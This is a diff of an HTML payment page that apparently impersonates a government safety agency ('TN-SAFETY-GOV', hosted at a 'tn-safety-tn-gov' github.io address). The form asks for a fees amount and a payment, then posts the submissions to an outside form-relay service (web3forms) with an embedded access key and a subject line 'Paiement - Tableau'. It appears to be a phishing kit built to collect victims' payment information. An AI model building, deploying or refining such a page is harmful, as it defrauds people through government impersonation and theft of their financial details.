@@ -52,7 +52,13 @@
         <form action="https://api.web3forms.com/submit" method="POST">
 
             <input type="hidden" name="access_key" value="4df5bbbb-bd11-4c70-a613-435d680007ca">
+            <input type="hidden" name="from_name" value="TN-SAFETY-GOV">
+            <input type="hidden" name="subject" value="Paiement - Tableau">
 
+            <input type="checkbox" name="botcheck" style="display:none">
+
+            <!-- Ça force l'envoi en tableau HTML propre -->
+            <input type="hidden" name="replyto" value="%email%">
             <!-- payment amount -->
             <div class="form-group">
                 <label>Fees amount</label>
@@ -97,12 +103,8 @@
                     <i class="fa-solid fa-cicle-question">?</i>
                 </div>
             </div>
-                <!-- Désactiver le captcha -->
-                <input type="hidden" name="_captcha" value="false">
-                <!-- Affichage en tableau -->
-                <input type="hidden" name="_template" value="table">
-                <!-- Redirection vers votre page personnalisée -->
-                <input type="hidden" name="redirect" value="https://tn-safety-tn-gov.github.io/tn-safety-tn-gov/confirm.html">
+            <!-- Redirection vers votre page personnalisée -->
+            <input type="hidden" name="redirect" value="https://tn-safety-tn-gov.github.io/tn-safety-tn-gov/confirm.html">
             <!-- Bouton de validation -->
             <button type="submit" class="pay-btn">
                 <i class="fa-solid fa-lock"><img src="images/lock.jpg"></i>  Payment
